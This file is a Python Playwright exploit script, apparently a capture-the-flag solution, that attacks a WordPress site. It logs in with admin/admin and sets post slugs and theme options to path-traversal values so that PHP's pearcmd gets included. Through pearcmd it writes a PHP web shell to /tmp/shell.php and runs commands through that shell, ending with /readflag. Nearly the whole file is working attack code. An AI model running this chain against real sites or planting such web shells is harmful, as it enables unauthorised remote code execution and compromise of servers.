import asyncio
import re
import sys
from urllib.parse import quote_plus

from playwright.async_api import async_playwright


async def main(target: str, cmd: str):
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            executable_path="/usr/bin/chromium", headless=False
        )
        page = await browser.new_page()
        # install
        await page.goto(f"{target}/")

        # login
        await page.goto(f"{target}/wp-login.php")
        await page.fill("#user_login", "admin")
        await page.fill("#user_pass", "admin")
        await page.click("#wp-submit")
        await page.wait_for_url(f"{target}/wp-admin/")
        await page.goto(f"{target}/wp-admin/edit.php")

        # check if we have enough posts
        rows = page.locator("#the-list tr")
        if await page.locator("#the-list tr").count() < 2:
            # if not, create a post
            await page.goto(f"{target}/wp-admin/post-new.php")
            cls = page.locator('button[aria-label="Close"]')
            if await cls.count() > 0:
                await cls.click()
            await (
                page.frame_locator('iframe[name="editor-canvas"]')
                .locator(".wp-block-post-title")
                .fill("test")
            )
            await page.click('.edit-post-header button:has-text("Publish")')
            await page.click('.editor-post-publish-panel button:has-text("Publish")')

        # now we should have enough posts
        await page.goto(f"{target}/wp-admin/edit.php")
        rows = page.locator("#the-list tr")
        assert await rows.count() >= 2, "wtf"
        # change post slugs to pearcmd and shell
        slugs = [
            "%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd",
            "%2f%2e%2e%2f%2e%2e%2ftmp%2fshell",
        ]
        ids = []
        for i in range(2):
            tr = rows.nth(i)
            title = tr.locator("a.row-title")
            url = await title.get_attribute("href")
            await tr.hover()
            await tr.locator('button:has-text("Quick Edit")').click()
            slug = page.locator('#the-list input[name="post_name"]')
            await slug.fill(slugs[i])
            await page.locator('#the-list button:has-text("Update")').click()
            post_id = int(re.search(r"post=(\d+)", url).group(1))
            ids.append(post_id)
        # get their corresponding pear_id and shell_id
        pear_id, shell_id = ids
        print(f"{pear_id = }")
        print(f"{shell_id = }")

        # now go to the options page
        await page.goto(f"{target}/wp-admin/options.php")
        # check if we have the right options
        if "../" not in await page.locator('input[name="stylesheet"]').input_value():
            # set stylesheet to tmp and upload path to /tmp/single-post-
            await page.fill('input[name="stylesheet"]', "../../../../../../../../tmp/")
            await page.fill('input[name="upload_path"]', "/tmp/single-post-")
            await page.click('input[type=submit][value="Save Changes"]')

            # then upload a dummy file to ensure /tmp/single-post- folder is created
            await page.goto(f"{target}/wp-admin/media-new.php?browser-uploader")
            upl = page.locator("#async-upload")
            await upl.set_input_files(
                [
                    {
                        "name": "test.txt",
                        "mimeType": "text/plain",
                        "buffer": b"kon peko",
                    }
                ]
            )
            await page.click('input[type=submit][value="Upload"]')
        await browser.close()

        # now we can use the pearcmd to write /tmp/shell.php
        p1 = await asyncio.create_subprocess_exec(
            "curl",
            "-g",
            "--",
            f"{target}/?p={pear_id}&+config-create+/<?system($_GET[0]);die();?>+/tmp/shell.php",
        )
        await p1.wait()

        # execute the command
        p2 = await asyncio.create_subprocess_exec(
            "curl", "--", f"{target}/?p={shell_id}&0={quote_plus(cmd)}"
        )
        await p2.wait()


target = "http://localhost:8000" if len(sys.argv) < 2 else sys.argv[1].rstrip("/")
asyncio.run(main(target, "id && ls -l / && /readflag"))
